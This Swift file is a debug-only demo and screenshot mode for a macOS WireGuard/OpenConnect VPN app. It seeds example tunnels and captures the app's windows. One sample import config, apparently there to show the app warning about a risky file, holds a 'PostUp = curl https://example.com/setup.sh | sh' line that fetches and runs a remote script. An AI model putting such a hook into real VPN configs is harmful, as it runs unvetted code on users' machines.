#if DEBUG
import AppKit
import NetworkExtension
import SwiftUI
import TunnelCore

/// Debug builds only. `WOMBAT_DEMO=1` fills the app with example tunnels (documentation
/// addresses, example.com hosts, throwaway keys) for screenshots; `WOMBAT_CAPTURE=<dir>` then
/// photographs the app's own windows in light and dark mode and quits. Capturing your own
/// windows needs no Screen Recording permission.
@MainActor
enum DemoMode {
    static var isOn: Bool { ProcessInfo.processInfo.environment["WOMBAT_DEMO"] == "1" }
    static var captureDirectory: String? { ProcessInfo.processInfo.environment["WOMBAT_CAPTURE"] }

    static func start(_ model: AppModel) {
        model.store.setDemoTunnels(makeTunnels())
        model.selection = model.store.tunnels.first?.id
        if captureDirectory != nil {
            // The app is sandboxed: write inside its own container and copy out afterwards.
            let dir = FileManager.default.temporaryDirectory.appendingPathComponent("screenshots").path
            Task { await capture(model, into: dir) }
        }
    }

    private static func makeTunnels() -> [Tunnel] {
        func key() -> String { KeyPair.publicKey(for: KeyPair.generatePrivateKey()).base64 }
        func config(_ text: String) -> TunnelConfiguration {
            WgQuick.parse("[Interface]\nPrivateKey = \(KeyPair.generatePrivateKey().base64)\n" + text).configuration!
        }
        func tunnel(_ name: String, _ status: NEVPNStatus, _ text: String, stats: RuntimeStats? = nil,
                    since: Date? = nil, onDemand: Bool = false, killSwitch: Bool = false) -> Tunnel {
            let manager = NETunnelProviderManager()
            manager.localizedDescription = name
            let proto = NETunnelProviderProtocol()
            proto.includeAllNetworks = killSwitch
            proto.excludeLocalNetworks = !killSwitch
            manager.protocolConfiguration = proto
            manager.isOnDemandEnabled = onDemand
            let t = Tunnel(manager: manager, id: UUID())
            let c = config(text)
            var s = stats
            if s != nil { s!.peers = c.peers.enumerated().map { i, p in
                var peer = stats!.peers[min(i, stats!.peers.count - 1)]
                peer.publicKey = p.publicKey.base64
                return peer
            } }
            t.setDemo(status: status, config: c, stats: s, since: since)
            return t
        }

        func anyConnect(_ name: String, _ status: NEVPNStatus, _ profile: OpenConnectProfile) -> Tunnel {
            let manager = NETunnelProviderManager()
            manager.localizedDescription = name
            let proto = NETunnelProviderProtocol()
            proto.providerBundleIdentifier = AppIdentity.openConnectExtensionBundleID
            manager.protocolConfiguration = proto
            let t = Tunnel(manager: manager, id: UUID())
            t.setDemo(status: status, profile: profile, stats: nil, since: nil)
            return t
        }

        let now = Date()
        let homeStats = RuntimeStats(listenPort: 51820, peers: [
            PeerStats(publicKey: "", endpoint: "198.51.100.24:51820", lastHandshake: now.addingTimeInterval(-38),
                      rxBytes: 1_843_201_337, txBytes: 212_640_511, persistentKeepalive: 25, allowedIPs: ["0.0.0.0/0", "::/0"]),
        ])
        return [
            tunnel("Home", .connected, """
            Address = 10.8.0.2/32, fd00:8::2/128
            DNS = 10.8.0.1
            [Peer]
            PublicKey = \(key())
            PresharedKey = \(KeyPair.generatePresharedKey().base64)
            AllowedIPs = 0.0.0.0/0, ::/0
            Endpoint = home.example.net:51820
            PersistentKeepalive = 25
            """, stats: homeStats, since: now.addingTimeInterval(-3 * 3600 - 17 * 60), killSwitch: true),
            tunnel("Office", .disconnected, """
            Address = 10.20.4.17/32
            DNS = 10.20.0.53, corp.example.com
            [Peer]
            PublicKey = \(key())
            AllowedIPs = 10.20.0.0/16, 10.21.0.0/16
            Endpoint = vpn.example.com:51820
            """, onDemand: true),
            tunnel("Staging cluster", .disconnected, """
            Address = 10.100.9.2/32
            [Peer]
            PublicKey = \(key())
            AllowedIPs = 10.100.0.0/16, 172.20.0.0/16
            Endpoint = 203.0.113.17:51820
            PersistentKeepalive = 25
            """),
            anyConnect("Work", .disconnected, OpenConnectProfile(server: URL(string: "https://vpn.example.edu/staff")!, group: "Staff", username: "jdoe")),
            tunnel("Travel", .disconnected, """
            Address = 10.66.0.9/32, fd00:66::9/128
            DNS = 10.66.0.1
            [Peer]
            PublicKey = \(key())
            PresharedKey = \(KeyPair.generatePresharedKey().base64)
            AllowedIPs = 0.0.0.0/0, ::/0
            Endpoint = travel.example.org:443
            """, killSwitch: true),
        ]
    }

    // MARK: Capture

    private static func capture(_ model: AppModel, into dir: String) async {
        try? FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
        try? await Task.sleep(for: .seconds(2))
        guard let window = NSApp.windows.first(where: { $0.identifier?.rawValue.contains("main") == true || $0.title == "Home" }) ?? NSApp.windows.first(where: { $0.isVisible && $0.canBecomeMain }) else {
            print("demo: no main window"); AppDelegate.quitWithoutAsking = true; NSApp.terminate(nil); return
        }
        window.setContentSize(NSSize(width: 1080, height: 680))
        window.center()

        // One appearance per launch when WOMBAT_CAPTURE_APPEARANCE is set (screenshots.sh): only
        // a fresh launch is sure to get the focus, and a second pass often rendered inactive.
        let only = ProcessInfo.processInfo.environment["WOMBAT_CAPTURE_APPEARANCE"]
        for (appearance, suffix) in [(NSAppearance.Name.darkAqua, "dark"), (.aqua, "light")] where only == nil || only == suffix {
            NSApp.appearance = NSAppearance(named: appearance)
            for tab in [DetailTab.overview, .connection, .configFile] {
                makeKey(window)
                model.detailTab = tab
                try? await Task.sleep(for: .milliseconds(900))
                await saveActive(window, "\(dir)/\(tab.rawValue.lowercased().replacingOccurrences(of: " ", with: "-"))-\(suffix).png")
            }
            model.detailTab = .overview

            // Import review sheet, with one clean config and one with problems.
            model.pendingImport = [
                ImportCandidate(name: "Lab", text: "[Interface]\nPrivateKey = \(KeyPair.generatePrivateKey().base64)\nAddress = 10.50.0.2/32\n[Peer]\nPublicKey = \(KeyPair.publicKey(for: KeyPair.generatePrivateKey()).base64)\nPresharedKey = \(KeyPair.generatePresharedKey().base64)\nAllowedIPs = 10.50.0.0/24\nEndpoint = lab.example.com:51820\n", source: "lab.conf"),
                ImportCandidate(name: "Downloaded", text: "[Interface]\nPrivateKey = \(KeyPair.generatePrivateKey().base64)\nAddress = 10.9.0.4/32\nPostUp = curl https://example.com/setup.sh | sh\n[Peer]\nPublicKey = \(KeyPair.publicKey(for: KeyPair.generatePrivateKey()).base64)\nAllowedIPs = 0.0.0.0/1, 128.0.0.0/1\nEndpoint = 192.0.2.80:51820\n", source: "vpn-free.conf"),
            ]
            makeKey(window)
            try? await Task.sleep(for: .milliseconds(1200))
            // A sheet is its own window: capture it directly.
            if let sheet = window.attachedSheet { save(sheet, "\(dir)/import-\(suffix).png") } else { print("demo: no import sheet") }
            model.pendingImport = []
            try? await Task.sleep(for: .milliseconds(600))

            // An AnyConnect VPN, connected (Home steps aside: one tunnel at a time).
            if let home = model.store.tunnels.first(where: { $0.name == "Home" }),
               let work = model.store.tunnels.first(where: { $0.isOpenConnect }), let profile = work.profile,
               let homeConfig = home.configuration {
                var status = OpenConnectStatus()
                status.rxBytes = 734_118_402; status.txBytes = 96_330_115
                status.ipv4 = "10.140.12.77/32"; status.dnsServers = ["10.140.0.53", "10.140.0.54"]
                status.routes = ["10.0.0.0/8", "172.16.0.0/12"]; status.gateway = "203.0.113.40"
                status.transport = "DTLS"; status.cipher = "DTLS1.2-ECDHE-RSA-AES256-GCM"
                status.connectedSince = Date().addingTimeInterval(-47 * 60)
                let homeStats = home.stats
                home.setDemo(status: .disconnected, config: homeConfig, stats: nil, since: nil)
                work.setDemo(status: .connected, profile: profile, stats: RuntimeStats(openConnect: status), since: status.connectedSince)
                model.selection = work.id
                makeKey(window)
                try? await Task.sleep(for: .milliseconds(900))
                await saveActive(window, "\(dir)/anyconnect-\(suffix).png")
                work.setDemo(status: .disconnected, profile: profile, stats: nil, since: nil)
                home.setDemo(status: .connected, config: homeConfig, stats: homeStats, since: Date().addingTimeInterval(-3 * 3600 - 17 * 60))

                // The browser sign-in step, on the VPN's Overview (no pop-up window).
                do {
                    let request = SSORequest(loginURL: URL(string: "https://vpn.example.edu/+CSCOE+/saml/sp/login")!,
                                             finalURL: "https://vpn.example.edu/+CSCOE+/saml_ac_login.html", tokenCookie: "acSamlv2Token",
                                             browserMode: "external")
                    SignInCoordinator.shared.setDemo(tunnelID: work.id, name: work.name, server: "vpn.example.edu", step: .browser(request))
                    try? await Task.sleep(for: .milliseconds(900))
                    await saveActive(window, "\(dir)/anyconnect-signin-\(suffix).png")
                    SignInCoordinator.shared.setDemo(tunnelID: nil, name: "", server: "", step: .working(""))
                }

                // The approval banner with its System Settings preview.
                model.openConnectInstaller.setDemoState(.needsApproval)
                try? await Task.sleep(for: .milliseconds(900))
                await saveActive(window, "\(dir)/extension-approval-\(suffix).png")
                model.openConnectInstaller.setDemoState(.active)
                // The same banner for the WireGuard extension, as on first launch.
                model.installer.setDemoState(.needsApproval)
                try? await Task.sleep(for: .milliseconds(900))
                await saveActive(window, "\(dir)/extension-approval-wireguard-\(suffix).png")
                model.installer.setDemoState(.active)
                model.selection = home.id
                try? await Task.sleep(for: .milliseconds(600))
            } else {
                print("demo: no AnyConnect demo VPN")
            }

            // The menu bar popover's content, in a window of the same width.
            let panel = NSPanel(contentRect: NSRect(x: 0, y: 0, width: 300, height: 260), styleMask: [.titled, .fullSizeContentView], backing: .buffered, defer: false)
            panel.titlebarAppearsTransparent = true
            panel.titleVisibility = .hidden
            panel.isMovable = false
            let host = NSHostingView(rootView: MenuBarContent().environmentObject(model).environmentObject(model.store)
                .padding(.top, 6).background(.regularMaterial))
            panel.contentView = host
            panel.setContentSize(host.fittingSize)
            // On the same display as the app window (center() picks the main display, which may
            // be a different, asleep or mirrored one).
            panel.setFrameTopLeftPoint(NSPoint(x: window.frame.minX + 60, y: window.frame.maxY - 60))
            // Above the main window, which makeKey floats; behind it the capture comes back empty.
            panel.level = NSWindow.Level(rawValue: NSWindow.Level.floating.rawValue + 1)
            panel.orderFrontRegardless()
            // Key in the active app, or its switches render in the inactive (gray) style. The
            // main window floats (makeKey) and would keep the focus: hand it to the panel.
            window.level = .normal
            panel.becomesKeyOnlyIfNeeded = false
            NSApp.activate()
            panel.makeKeyAndOrderFront(nil)
            try? await Task.sleep(for: .milliseconds(900))
            if !panel.isKeyWindow { print("demo: the menu bar panel is not key; its switches render gray") }
            save(panel, "\(dir)/menubar-\(suffix).png")
            panel.close()
            makeKey(window)  // the main window must be main again for the next pass
        }
        print("demo: captured to \(dir)")
        AppDelegate.quitWithoutAsking = true; NSApp.terminate(nil)
    }

    /// Saves only once the window is key in the active app: an inactive window renders gray
    /// traffic lights and switches (pitfall 16), which happens while someone uses the Mac.
    private static func saveActive(_ window: NSWindow, _ path: String) async {
        for attempt in 0..<20 {
            if NSApp.isActive && window.isKeyWindow && window.isMainWindow { break }
            if attempt == 19 { print("demo: \(path) is inactive (the app never got focus)") }
            makeKey(window)
            try? await Task.sleep(for: .milliseconds(300))
        }
        save(window, path)
    }

    /// A background app can't take focus, so float the window, order it front and make it key
    /// (playbook: cooperative activation). An inactive window renders dimmed.
    private static func makeKey(_ window: NSWindow) {
        NSApp.activate()
        window.level = .floating
        window.orderFrontRegardless()
        window.makeKeyAndOrderFront(nil)
        window.makeMain()
    }

    private typealias CreateImage = @convention(c) (CGRect, UInt32, UInt32, UInt32) -> Unmanaged<CGImage>?

    /// CGWindowListCreateImage is unavailable to Swift on current SDKs; it still works for the
    /// calling app's own windows, so look it up at run time.
    private static func save(_ window: NSWindow, _ path: String) {
        guard let handle = dlopen("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics", RTLD_NOW),
              let symbol = dlsym(handle, "CGWindowListCreateImage") else { print("demo: no CGWindowListCreateImage"); return }
        let create = unsafeBitCast(symbol, to: CreateImage.self)
        // kCGWindowListOptionIncludingWindow = 1 << 3; kCGWindowImageDefault (keeps the shadow) = 0
        guard let image = create(.null, 1 << 3, UInt32(window.windowNumber), 0)?.takeRetainedValue() else {
            print("demo: capture failed for \(path) (window \(window.windowNumber), frame \(window.frame), visible \(window.isVisible), onScreen \(window.occlusionState.contains(.visible)))"); return
        }
        let rep = NSBitmapImageRep(cgImage: image)
        do {
            try rep.representation(using: .png, properties: [:])!.write(to: URL(fileURLWithPath: path))
            print("demo: wrote \(path) (\(image.width)x\(image.height))")
        } catch {
            print("demo: could not write \(path): \(error.localizedDescription)")
        }
    }
}
#endif
